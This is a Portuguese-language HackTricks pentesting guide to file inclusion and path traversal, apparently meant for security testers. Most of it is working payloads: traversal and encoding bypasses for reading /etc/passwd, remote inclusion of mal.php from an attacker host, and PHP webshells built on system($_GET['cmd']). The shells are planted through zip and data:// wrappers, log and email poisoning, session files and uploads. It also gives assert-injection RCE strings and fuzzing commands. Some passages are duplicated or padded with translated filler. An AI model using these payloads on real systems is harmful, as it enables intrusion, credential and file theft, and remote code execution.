# Inclusão de Arquivo/Travessia de Caminho

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Você trabalha em uma **empresa de segurança cibernética**? Você quer ver sua **empresa anunciada no HackTricks**? ou você quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe suas técnicas de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e** [**repositório hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

**HackenProof é o lar de todas as recompensas por bugs de criptografia.**

**Seja recompensado sem atrasos**\
As recompensas do HackenProof são lançadas apenas quando os clientes depositam o orçamento de recompensa. Você receberá a recompensa após a verificação do bug.

**Adquira experiência em pentesting web3**\
Protocolos de blockchain e contratos inteligentes são a nova Internet! Domine a segurança web3 em seus dias de ascensão.

**Torne-se uma lenda do hacker web3**\
Ganhe pontos de reputação com cada bug verificado e conquiste o topo do leaderboard semanal.

[**Cadastre-se no HackenProof**](https://hackenproof.com/register) comece a ganhar com seus hacks!

{% embed url="https://hackenproof.com/register" %}

## Inclusão de Arquivo

**Inclusão de Arquivo Remoto (RFI):** O arquivo é carregado de um servidor remoto (Melhor: você pode escrever o código e o servidor irá executá-lo). No php isso é **desativado** por padrão (**allow\_url\_include**).\
**Inclusão de Arquivo Local (LFI):** O servidor carrega um arquivo local.

A vulnerabilidade ocorre quando o usuário pode controlar de alguma forma o arquivo que será carregado pelo servidor.

Funções PHP vulneráveis: require, require\_once, include, include\_once

Uma ferramenta interessante para explorar essa vulnerabilidade: [https://github.com/kurobeats/fimap](https://github.com/kurobeats/fimap)

## Cegueira - Interessante - Arquivos LFI2RCE
```python
wfuzz -c -w ./lfi2.txt --hw 0 http://10.10.10.10/nav.php?page=../../../../../../../FUZZ
```
### **Linux**

**Misturando várias listas de LFI \*nix e adicionando mais caminhos, criei esta:**

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_linux.txt" %}

Tente também trocar `/` por `\`\
Tente também adicionar `../../../../../`

Uma lista que usa várias técnicas para encontrar o arquivo /etc/password (para verificar se a vulnerabilidade existe) pode ser encontrada [aqui](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-nix.txt)

### **Windows**

Mesclando várias listas, criei esta:

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt" %}

Tente também trocar `/` por `\`\
Tente também remover `C:/` e adicionar `../../../../../`

Uma lista que usa várias técnicas para encontrar o arquivo /boot.ini (para verificar se a vulnerabilidade existe) pode ser encontrada [aqui](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-win.txt)

### **OS X**

Verifique a lista de LFI do Linux.

## LFI básico e bypasses

Todos os exemplos são para Inclusão de Arquivo Local, mas também podem ser aplicados à Inclusão de Arquivo Remoto (page=[http://meuserver.com/phpshellcode.txt\\](http://meuserver.com/phpshellcode.txt\)/).
```
http://example.com/index.php?page=../../../etc/passwd
```
### Sequências de travessia removidas de forma não recursiva

When performing a file inclusion vulnerability assessment, it is common to encounter web applications that implement input validation mechanisms to prevent directory traversal attacks. One common technique used to bypass these filters is to strip traversal sequences from the user input in a non-recursive manner.

Durante a realização de uma avaliação de vulnerabilidade de inclusão de arquivo, é comum encontrar aplicações web que implementam mecanismos de validação de entrada para evitar ataques de travessia de diretório. Uma técnica comum usada para contornar esses filtros é remover as sequências de travessia da entrada do usuário de forma não recursiva.

This technique involves repeatedly replacing traversal sequences such as "../" or "..\" with an empty string until no more occurrences are found. By doing so, the attacker can bypass the input validation and access files outside the intended directory.

Essa técnica envolve substituir repetidamente sequências de travessia, como "../" ou "..\", por uma string vazia até que não haja mais ocorrências. Ao fazer isso, o atacante pode contornar a validação de entrada e acessar arquivos fora do diretório pretendido.
```python
http://example.com/index.php?page=....//....//....//etc/passwd
http://example.com/index.php?page=....\/....\/....\/etc/passwd
http://some.domain.com/static/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd
```
### **Byte nulo (%00)**

Bypass para adicionar mais caracteres ao final da string fornecida (bypass de: $\_GET\['param']."php")
```
http://example.com/index.php?page=../../../etc/passwd%00
```
Isso está **resolvido desde o PHP 5.4**

### **Codificação**

Você pode usar codificações não padrão, como codificação de URL dupla (e outras):
```
http://example.com/index.php?page=..%252f..%252f..%252fetc%252fpasswd
http://example.com/index.php?page=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
```
### A partir da pasta existente

Talvez o back-end esteja verificando o caminho da pasta:
```python
http://example.com/index.php?page=utils/scripts/../../../../../etc/passwd
```
### Identificando pastas em um servidor

Dependendo do código aplicativo / caracteres permitidos, pode ser possível explorar recursivamente o sistema de arquivos descobrindo pastas e não apenas arquivos. Para fazer isso:

* identifique a "profundidade" do seu diretório atual ao recuperar com sucesso `/etc/passwd` (se estiver no Linux):
```
http://example.com/index.php?page=../../../etc/passwd # depth of 3
```
* tente adivinhar o nome de uma pasta no diretório atual adicionando o nome da pasta (aqui, `private`), e depois voltando para `/etc/passwd`:
```
http://example.com/index.php?page=private/../../../../etc/passwd # we went deeper down one level, so we have to go 3+1=4 levels up to go back to /etc/passwd
```
* se a aplicação for vulnerável, pode haver dois resultados diferentes para a solicitação:
* se você receber um erro / nenhuma saída, a pasta `private` não existe neste local
* se você receber o conteúdo de `/etc/passwd`, você validou que de fato existe uma pasta `private` no seu diretório atual
* as pastas que você descobriu usando essas técnicas podem então ser fuzzed para arquivos (usando um método clássico de LFI) ou para subdiretórios usando a mesma técnica recursivamente.

É possível adaptar essa técnica para encontrar diretórios em qualquer localização no sistema de arquivos. Por exemplo, se, sob a mesma hipótese (diretório atual com profundidade 3 no sistema de arquivos), você deseja verificar se `/var/www/` contém um diretório `private`, use a seguinte carga útil:
```
http://example.com/index.php?page=../../../var/www/private/../../../etc/passwd
```
A seguinte sequência de comandos permite a geração de payloads usando `sed` (1) como entrada para ferramentas de fuzzing de URL, como `ffuf` (2):
```
$ sed 's_^_../../../var/www/_g' /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt | sed 's_$_/../../../etc/passwd_g' > payloads.txt
$ ffuf -u http://example.com/index.php?page=FUZZ -w payloads.txt -mr "root"
```
### **Truncamento de caminho**

Bypassa a adição de mais caracteres no final da string fornecida (bypass de: $\_GET\['param']."php")
```
In PHP: /etc/passwd = /etc//passwd = /etc/./passwd = /etc/passwd/ = /etc/passwd/.
Check if last 6 chars are passwd --> passwd/
Check if last 4 chars are ".php" --> shellcode.php/.
```

```
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd..\.\.\.\.\.\.\.\.\.\.\[ADD MORE]\.\.
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd/././.[ADD MORE]/././.

#With the next options, by trial and error, you have to discover how many "../" are needed to delete the appended string but not "/etc/passwd" (near 2027)

http://example.com/index.php?page=a/./.[ADD MORE]/etc/passwd
http://example.com/index.php?page=a/../../../../[ADD MORE]../../../../../etc/passwd
```
Sempre tente **iniciar** o caminho com um diretório falso (a/).

**Essa vulnerabilidade foi corrigida no PHP 5.3.**

### **Truques de bypass de filtro**
```
http://example.com/index.php?page=....//....//etc/passwd
http://example.com/index.php?page=..///////..////..//////etc/passwd
http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
Maintain the initial path: http://example.com/index.php?page=/var/www/../../etc/passwd
```
# RFI Básico

O RFI (Remote File Inclusion) é uma vulnerabilidade comum em aplicações web que permite a um invasor incluir arquivos remotos no código da aplicação. Isso pode levar à execução de código arbitrário e comprometer a segurança do sistema.

O RFI básico ocorre quando um aplicativo web não valida adequadamente os dados de entrada fornecidos pelo usuário antes de incluir arquivos remotos. Isso permite que um invasor especifique um URL remoto que será incluído no código da aplicação.

Para explorar essa vulnerabilidade, um invasor pode fornecer um URL remoto que aponta para um arquivo malicioso contendo código que deseja executar. Quando o aplicativo web inclui esse arquivo remoto, o código malicioso é executado no contexto da aplicação, permitindo que o invasor execute comandos arbitrários.

Para evitar o RFI básico, é importante validar e filtrar cuidadosamente todos os dados de entrada fornecidos pelo usuário antes de incluí-los no código da aplicação. Isso pode ser feito verificando se os URLs fornecidos são confiáveis e limitando o acesso a arquivos remotos apenas a locais seguros.

É altamente recomendável que os desenvolvedores implementem práticas de segurança adequadas, como a utilização de listas brancas de URLs permitidos e a utilização de funções de filtragem de entrada, para mitigar o risco de RFI básico em suas aplicações web.
```python
http://example.com/index.php?page=http://atacker.com/mal.php
http://example.com/index.php?page=\\attacker.com\shared\mal.php
```
## Elemento Raiz do Python

Em python, em um código como este:
```python
# file_name is controlled by a user
os.path.join(os.getcwd(), "public", file_name)
```
Se o usuário passar um **caminho absoluto** para **`file_name`**, o **caminho anterior é simplesmente removido**:
```python
os.path.join(os.getcwd(), "public", "/etc/passwd")
'/etc/passwd'
```
É o comportamento esperado de acordo com [a documentação](https://docs.python.org/3.10/library/os.path.html#os.path.join):

> Se um componente for um caminho absoluto, todos os componentes anteriores são descartados e a junção continua a partir do componente de caminho absoluto.

## Listar Diretórios em Java

Parece que se você tiver uma Traversal de Caminho em Java e **solicitar um diretório** em vez de um arquivo, será retornada uma **lista do diretório**. Isso não acontecerá em outras linguagens (pelo que eu saiba).

## Top 25 parâmetros

Aqui está uma lista dos 25 principais parâmetros que podem ser vulneráveis a vulnerabilidades de inclusão de arquivo local (LFI) (de [link](https://twitter.com/trbughunters/status/1279768631845494787)):
```
?cat={payload}
?dir={payload}
?action={payload}
?board={payload}
?date={payload}
?detail={payload}
?file={payload}
?download={payload}
?path={payload}
?folder={payload}
?prefix={payload}
?include={payload}
?page={payload}
?inc={payload}
?locate={payload}
?show={payload}
?doc={payload}
?site={payload}
?type={payload}
?view={payload}
?content={payload}
?document={payload}
?layout={payload}
?mod={payload}
?conf={payload}
```
## LFI / RFI usando wrappers e protocolos PHP

### php://filter

Os filtros do PHP permitem realizar operações básicas de **modificação nos dados** antes de serem lidos ou gravados. Existem 5 categorias de filtros:

* [Filtros de String](https://www.php.net/manual/en/filters.string.php):
* `string.rot13`
* `string.toupper`
* `string.tolower`
* `string.strip_tags`: Remove as tags dos dados (tudo entre os caracteres "<" e ">")
* Note que este filtro desapareceu das versões modernas do PHP
* [Filtros de Conversão](https://www.php.net/manual/en/filters.convert.php)
* `convert.base64-encode`
* `convert.base64-decode`
* `convert.quoted-printable-encode`
* `convert.quoted-printable-decode`
* `convert.iconv.*` : Transforma para uma codificação diferente (`convert.iconv.<input_enc>.<output_enc>`). Para obter a **lista de todas as codificações** suportadas, execute no console: `iconv -l`

{% hint style="warning" %}
Abusando do filtro de conversão `convert.iconv.*`, você pode **gerar texto arbitrário**, o que pode ser útil para escrever texto arbitrário ou fazer com que uma função como include processe texto arbitrário. Para mais informações, consulte [**LFI2RCE via php filters**](lfi2rce-via-php-filters.md).
{% endhint %}

* [Filtros de Compressão](https://www.php.net/manual/en/filters.compression.php)
* `zlib.deflate`: Comprime o conteúdo (útil se estiver extraindo muitas informações)
* `zlib.inflate`: Descomprime os dados
* [Filtros de Criptografia](https://www.php.net/manual/en/filters.encryption.php)
* `mcrypt.*` : Descontinuado
* `mdecrypt.*` : Descontinuado
* Outros Filtros
* Executando `var_dump(stream_get_filters());` no PHP, você pode encontrar alguns **filtros inesperados**:
* `consumed`
* `dechunk`: reverte a codificação chunked do HTTP
* `convert.*`
```php
# String Filters
## Chain string.toupper, string.rot13 and string.tolower reading /etc/passwd
echo file_get_contents("php://filter/read=string.toupper|string.rot13|string.tolower/resource=file:///etc/passwd");
## Same chain without the "|" char
echo file_get_contents("php://filter/string.toupper/string.rot13/string.tolower/resource=file:///etc/passwd");
## string.string_tags example
echo file_get_contents("php://filter/string.strip_tags/resource=data://text/plain,<b>Bold</b><?php php code; ?>lalalala");

# Conversion filter
## B64 decode
echo file_get_contents("php://filter/convert.base64-decode/resource=data://plain/text,aGVsbG8=");
## Chain B64 encode and decode
echo file_get_contents("php://filter/convert.base64-encode|convert.base64-decode/resource=file:///etc/passwd");
## convert.quoted-printable-encode example
echo file_get_contents("php://filter/convert.quoted-printable-encode/resource=data://plain/text,£hellooo=");
=C2=A3hellooo=3D
## convert.iconv.utf-8.utf-16le
echo file_get_contents("php://filter/convert.iconv.utf-8.utf-16le/resource=data://plain/text,trololohellooo=");

# Compresion Filter
## Compress + B64
echo file_get_contents("php://filter/zlib.deflate/convert.base64-encode/resource=file:///etc/passwd");
readfile('php://filter/zlib.inflate/resource=test.deflated'); #To decompress the data locally
```
{% hint style="warning" %}
A parte "php://filter" é case insensitive
{% endhint %}

### php://fd

Este wrapper permite acessar descritores de arquivo que o processo tem aberto. Potencialmente útil para exfiltrar o conteúdo de arquivos abertos:
```php
echo file_get_contents("php://fd/3");
$myfile = fopen("/etc/passwd", "r");
```
Você também pode usar **php://stdin, php://stdout e php://stderr** para acessar os **descritores de arquivo 0, 1 e 2**, respectivamente (não tenho certeza de como isso poderia ser útil em um ataque)

### zip:// e rar://

Faça o upload de um arquivo Zip ou Rar com um PHPShell dentro e acesse-o.\
Para poder abusar do protocolo rar, **é necessário ativá-lo especificamente**.
```bash
echo "<pre><?php system($_GET['cmd']); ?></pre>" > payload.php;
zip payload.zip payload.php;
mv payload.zip shell.jpg;
rm payload.php

http://example.com/index.php?page=zip://shell.jpg%23payload.php

# To compress with rar
rar a payload.rar payload.php;
mv payload.rar shell.jpg;
rm payload.php
http://example.com/index.php?page=rar://shell.jpg%23payload.php
```
### data://

A data:// é uma técnica de inclusão de arquivo que explora a capacidade de um aplicativo web de ler dados de um URI (Uniform Resource Identifier). O URI começa com o esquema "data://" e contém os dados que serão lidos pelo aplicativo.

Essa técnica pode ser explorada para incluir arquivos arbitrários no aplicativo web, permitindo que um invasor acesse informações confidenciais ou execute código malicioso. O invasor pode fornecer um URI que contenha um arquivo malicioso, como um script PHP, que será executado pelo aplicativo.

Para explorar essa vulnerabilidade, o invasor precisa identificar pontos de inclusão de arquivo no aplicativo web e fornecer um URI que aponte para o arquivo desejado. É importante ressaltar que essa técnica só funciona se o aplicativo web permitir a leitura de dados de URIs.

Os desenvolvedores podem proteger seus aplicativos contra ataques de inclusão de arquivo, validando e filtrando cuidadosamente os URIs fornecidos pelos usuários. Além disso, é recomendável desabilitar a leitura de dados de URIs, a menos que seja estritamente necessário para o funcionamento do aplicativo.
```
http://example.net/?page=data://text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data://text/plain,<?php phpinfo(); ?>
http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
http://example.net/?page=data:text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data:text/plain,<?php phpinfo(); ?>
http://example.net/?page=data:text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
Fato interessante: você pode acionar um XSS e contornar o Auditor do Chrome com: `http://example.com/index.php?page=data:application/x-httpd-php;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+`

Observe que esse protocolo é restrito pelas configurações do PHP **`allow_url_open`** e **`allow_url_include`**

### expect://

O Expect deve ser ativado. Você pode executar código usando isso.
```
http://example.com/index.php?page=expect://id
http://example.com/index.php?page=expect://ls
```
### input://

Especifique sua carga útil nos parâmetros POST
```
http://example.com/index.php?page=php://input
POST DATA: <?php system('id'); ?>
```
### phar://

Um arquivo `.phar` também pode ser usado para executar código PHP se o site estiver usando alguma função como `include` para carregar o arquivo.

{% code title="create_phar.php" %}
```python
<?php
$phar = new Phar('test.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub('<?php __HALT_COMPILER(); system("ls"); ?>');

$phar->stopBuffering();
```
{% endcode %}

E você pode compilar o `phar` executando a seguinte linha:
```bash
php --define phar.readonly=0 create_path.php
```
Será gerado um arquivo chamado `test.phar` que você pode usar para abusar do LFI.

Se o LFI estiver apenas lendo o arquivo e não executando o código PHP dentro dele, por exemplo, usando funções como _**file\_get\_contents(), fopen(), file() ou file\_exists(), md5\_file(), filemtime() ou filesize()**_**. Você pode tentar abusar de uma **desserialização** que ocorre ao **ler** um **arquivo** usando o protocolo **phar**.\
Para mais informações, leia o seguinte post:

{% content-ref url="phar-deserialization.md" %}
[phar-deserialization.md](phar-deserialization.md)
{% endcontent-ref %}

### Mais protocolos

Verifique mais possíveis [**protocolos para incluir aqui**](https://www.php.net/manual/en/wrappers.php)**:**

* [php://memory e php://temp](https://www.php.net/manual/en/wrappers.php.php#wrappers.php.memory) — Escrever na memória ou em um arquivo temporário (não tenho certeza de como isso pode ser útil em um ataque de inclusão de arquivo)
* [file://](https://www.php.net/manual/en/wrappers.file.php) — Acessar o sistema de arquivos local
* [http://](https://www.php.net/manual/en/wrappers.http.php) — Acessar URLs HTTP(s)
* [ftp://](https://www.php.net/manual/en/wrappers.ftp.php) — Acessar URLs FTP(s)
* [zlib://](https://www.php.net/manual/en/wrappers.compression.php) — Fluxos de compressão
* [glob://](https://www.php.net/manual/en/wrappers.glob.php) — Encontrar nomes de caminho que correspondam ao padrão (não retorna nada imprimível, então não é realmente útil aqui)
* [ssh2://](https://www.php.net/manual/en/wrappers.ssh2.php) — Secure Shell 2
* [ogg://](https://www.php.net/manual/en/wrappers.audio.php) — Fluxos de áudio (não útil para ler arquivos arbitrários)

## LFI via 'assert' do PHP

Se você encontrar um LFI difícil que parece estar filtrando strings de travessia como ".." e respondendo com algo como "Tentativa de invasão" ou "Boa tentativa!", uma carga útil de injeção 'assert' pode funcionar.

Uma carga útil como esta:
```
' and die(show_source('/etc/passwd')) or '
```
irá explorar com sucesso o código PHP para um parâmetro "file" que se parece com isso:
```bash
assert("strpos('$file', '..') === false") or die("Detected hacking attempt!");
```
Também é possível obter RCE em uma declaração "assert" vulnerável usando a função system():
```
' and die(system("whoami")) or '
```
Certifique-se de codificar as cargas úteis em URL antes de enviá-las.

<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

**HackenProof é o lar de todas as recompensas por bugs de criptografia.**

**Seja recompensado sem atrasos**\
As recompensas do HackenProof são lançadas apenas quando os clientes depositam o orçamento de recompensa. Você receberá a recompensa após a verificação do bug.

**Adquira experiência em pentesting web3**\
Protocolos de blockchain e contratos inteligentes são a nova Internet! Domine a segurança web3 em seus dias de ascensão.

**Torne-se a lenda dos hackers web3**\
Ganhe pontos de reputação com cada bug verificado e conquiste o topo do leaderboard semanal.

[**Cadastre-se no HackenProof**](https://hackenproof.com/register) e comece a ganhar com seus hacks!

{% embed url="https://hackenproof.com/register" %}

## Traversal de Caminho Cego em PHP

{% hint style="warning" %}
Essa técnica é relevante em casos em que você **controla** o **caminho do arquivo** de uma **função PHP** que irá **acessar um arquivo**, mas você não verá o conteúdo do arquivo (como uma chamada simples para **`file()`**), mas o conteúdo não é mostrado.
{% endhint %}

Neste [**post incrível**](https://www.synacktiv.com/en/publications/php-filter-chains-file-read-from-error-based-oracle.html), é explicado como uma traversal de caminho cego pode ser abusada por meio do filtro PHP para **extrair o conteúdo de um arquivo por meio de um oráculo de erro**.

Em resumo, a técnica usa a codificação **"UCS-4LE"** para tornar o conteúdo de um arquivo tão **grande** que a **função PHP de abertura** do arquivo irá disparar um **erro**.

Em seguida, para vazar o primeiro caractere, o filtro **`dechunk`** é usado junto com outros, como **base64** ou **rot13**, e, finalmente, os filtros **convert.iconv.UCS-4.UCS-4LE** e **convert.iconv.UTF16.UTF-16BE** são usados para **colocar outros caracteres no início e vazá-los**.

**Funções que podem ser vulneráveis**: `file_get_contents`, `readfile`, `finfo->file`, `getimagesize`, `md5_file`, `sha1_file`, `hash_file`, `file`, `parse_ini_file`, `copy`, `file_put_contents (somente alvo somente leitura com isso)`, `stream_get_contents`, `fgets`, `fread`, `fgetc`, `fgetcsv`, `fpassthru`, `fputs`

Para obter detalhes técnicos, consulte o post mencionado!

## LFI2RCE

### RFI Básico
```python
http://example.com/index.php?page=http://atacker.com/mal.php
http://example.com/index.php?page=\\attacker.com\shared\mal.php
```
### Através do arquivo de log do Apache/Nginx

Se o servidor Apache ou Nginx for **vulnerável a LFI** dentro da função include, você pode tentar acessar **`/var/log/apache2/access.log` ou `/var/log/nginx/access.log`**, inserindo dentro do **user agent** ou dentro de um **parâmetro GET** um shell php como **`<?php system($_GET['c']); ?>`** e incluir esse arquivo.

{% hint style="warning" %}
Observe que, **se você usar aspas duplas** para o shell em vez de **aspas simples**, as aspas duplas serão modificadas para a string "_**quote;**_", o **PHP lançará um erro** e **nada mais será executado**.

Além disso, certifique-se de **escrever corretamente o payload**, caso contrário o PHP lançará um erro toda vez que tentar carregar o arquivo de log e você não terá uma segunda oportunidade.
{% endhint %}

Isso também pode ser feito em outros logs, mas **tenha cuidado**, o código dentro dos logs pode estar codificado em URL e isso pode destruir o Shell. O cabeçalho **authorisation "basic"** contém "usuário:senha" em Base64 e é decodificado nos logs. O PHPShell pode ser inserido dentro desse cabeçalho.\
Outros possíveis caminhos de log:
```python
/var/log/apache2/access.log
/var/log/apache/access.log
/var/log/apache2/error.log
/var/log/apache/error.log
/usr/local/apache/log/error_log
/usr/local/apache2/log/error_log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/httpd/error_log
```
Lista de palavras para fuzzing: [https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI)

### Via Email

**Envie um email** para uma conta interna (user@localhost) contendo seu payload PHP como `<?php echo system($_REQUEST["cmd"]); ?>` e tente incluir o email do usuário com um caminho como **`/var/mail/<NOME_DE_USUÁRIO>`** ou **`/var/spool/mail/<NOME_DE_USUÁRIO>`**

### Via /proc/\*/fd/\*

1. Faça o upload de muitos shells (por exemplo: 100)
2. Inclua [http://example.com/index.php?page=/proc/$PID/fd/$FD](http://example.com/index.php?page=/proc/$PID/fd/$FD), com $PID = PID do processo (pode ser forçado por brute force) e $FD o descritor de arquivo (também pode ser forçado por brute force)

### Via /proc/self/environ

Como um arquivo de log, envie o payload no User-Agent, ele será refletido dentro do arquivo /proc/self/environ
```
GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1
User-Agent: <?=phpinfo(); ?>
```
### Via upload

Se você pode fazer o upload de um arquivo, basta injetar a carga útil do shell nele (por exemplo: `<?php system($_GET['c']); ?>`).
```
http://example.com/index.php?page=path/to/uploaded/file.png
```
Para manter o arquivo legível, é melhor injetar nos metadados das imagens/doc/pdf.

### Através do upload de arquivo ZIP

Faça o upload de um arquivo ZIP contendo um shell PHP comprimido e acesse:
```python
example.com/page.php?file=zip://path/to/zip/hello.zip%23rce.php
```
### Via sessões PHP

Verifique se o site utiliza sessões PHP (PHPSESSID)
```
Set-Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27; path=/
Set-Cookie: user=admin; expires=Mon, 13-Aug-2018 20:21:29 GMT; path=/; httponly
```
Em PHP, essas sessões são armazenadas em arquivos _/var/lib/php5/sess\\_\[PHPSESSID]\_
```
/var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27.
user_ip|s:0:"";loggedin|s:0:"";lang|s:9:"en_us.php";win_lin|s:0:"";user|s:6:"admin";pass|s:6:"admin";
```
Defina o cookie como `<?php system('cat /etc/passwd');?>`
```
login=1&user=<?php system("cat /etc/passwd");?>&pass=password&lang=en_us.php
```
# Inclusão de Arquivo Local (LFI) para incluir o arquivo de sessão PHP

A Inclusão de Arquivo Local (LFI) é uma técnica de hacking que permite a um invasor incluir arquivos arbitrários em um aplicativo da web. Essa técnica pode ser explorada para incluir o arquivo de sessão PHP, que contém informações confidenciais sobre a sessão do usuário.

## Como funciona o LFI?

O LFI ocorre quando um aplicativo da web permite que o usuário especifique o caminho de um arquivo a ser incluído. Se o aplicativo não validar adequadamente o caminho fornecido pelo usuário, um invasor pode manipulá-lo para incluir arquivos arbitrários.

## Explorando o LFI para incluir o arquivo de sessão PHP

Ao explorar o LFI para incluir o arquivo de sessão PHP, um invasor pode obter acesso às informações confidenciais armazenadas na sessão do usuário. Isso pode incluir dados como nomes de usuário, senhas e outras informações pessoais.

Para realizar essa exploração, o invasor precisa identificar uma vulnerabilidade de LFI no aplicativo da web alvo. Em seguida, ele pode manipular o caminho do arquivo a ser incluído para apontar para o arquivo de sessão PHP.

Uma vez que o invasor tenha acesso ao arquivo de sessão PHP, ele pode extrair as informações confidenciais contidas nele. Isso pode ser feito lendo o conteúdo do arquivo ou até mesmo decodificando-o, se necessário.

## Protegendo contra ataques de LFI

Para proteger um aplicativo da web contra ataques de LFI, é importante implementar as seguintes práticas recomendadas:

- Validar e filtrar todas as entradas do usuário para garantir que elas não contenham caracteres especiais ou sequências que possam ser usadas para manipular o caminho do arquivo.
- Utilizar listas brancas para permitir apenas caminhos de arquivo válidos e rejeitar qualquer entrada que não esteja na lista.
- Limitar as permissões de acesso aos arquivos do aplicativo, garantindo que apenas os arquivos necessários sejam acessíveis.
- Manter o software do aplicativo atualizado, aplicando patches de segurança e correções fornecidos pelos desenvolvedores.

Ao implementar essas práticas, é possível reduzir significativamente o risco de um ataque de LFI bem-sucedido e proteger as informações confidenciais dos usuários.
```
login=1&user=admin&pass=password&lang=/../../../../../../../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm2
```
### Via ssh

Se o ssh estiver ativo, verifique qual usuário está sendo usado (/proc/self/status e /etc/passwd) e tente acessar **\<HOME>/.ssh/id\_rsa**

### **Via** **logs** do **vsftpd**

Os logs deste servidor FTP são armazenados em _**/var/log/vsftpd.log**_. Se você tiver uma LFI e puder acessar um servidor vsftpd exposto, você pode tentar fazer login definindo o payload PHP no nome de usuário e, em seguida, acessar os logs usando a LFI.

### Via filtros php (sem necessidade de arquivo)

Este [**artigo**](https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d) explica que você pode usar **filtros php para gerar conteúdo arbitrário** como saída. O que basicamente significa que você pode **gerar código php arbitrário** para a inclusão **sem precisar escrevê-lo** em um arquivo.

{% content-ref url="lfi2rce-via-php-filters.md" %}
[lfi2rce-via-php-filters.md](lfi2rce-via-php-filters.md)
{% endcontent-ref %}

### Via falha de segmentação

**Faça upload** de um arquivo que será armazenado temporariamente em `/tmp`, em seguida, na **mesma solicitação**, provoque uma **falha de segmentação**, e então o **arquivo temporário não será excluído** e você pode procurá-lo.

{% content-ref url="lfi2rce-via-segmentation-fault.md" %}
[lfi2rce-via-segmentation-fault.md](lfi2rce-via-segmentation-fault.md)
{% endcontent-ref %}

### Via armazenamento de arquivos temporários do Nginx

Se você encontrou uma **Inclusão Local de Arquivos** e o **Nginx** está sendo executado na frente do PHP, você pode obter RCE com a seguinte técnica:

{% content-ref url="lfi2rce-via-nginx-temp-files.md" %}
[lfi2rce-via-nginx-temp-files.md](lfi2rce-via-nginx-temp-files.md)
{% endcontent-ref %}

### Via PHP\_SESSION\_UPLOAD\_PROGRESS

Se você encontrou uma **Inclusão Local de Arquivos**, mesmo que você **não tenha uma sessão** e `session.auto_start` esteja `Off`. Se você fornecer o **`PHP_SESSION_UPLOAD_PROGRESS`** nos dados **multipart POST**, o PHP irá **ativar a sessão para você**. Você pode abusar disso para obter RCE:

{% content-ref url="via-php_session_upload_progress.md" %}
[via-php\_session\_upload\_progress.md](via-php\_session\_upload\_progress.md)
{% endcontent-ref %}

### Via uploads de arquivos temporários no Windows

Se você encontrou uma **Inclusão Local de Arquivos** e o servidor está sendo executado no **Windows**, você pode obter RCE:

{% content-ref url="lfi2rce-via-temp-file-uploads.md" %}
[lfi2rce-via-temp-file-uploads.md](lfi2rce-via-temp-file-uploads.md)
{% endcontent-ref %}

### Via phpinfo() (file\_uploads = on)

Se você encontrou uma **Inclusão Local de Arquivos** e um arquivo expondo **phpinfo()** com file\_uploads = on, você pode obter RCE:

{% content-ref url="lfi2rce-via-phpinfo.md" %}
[lfi2rce-via-phpinfo.md](lfi2rce-via-phpinfo.md)
{% endcontent-ref %}

### Via compress.zlib + `PHP_STREAM_PREFER_STUDIO` + Divulgação de Caminho

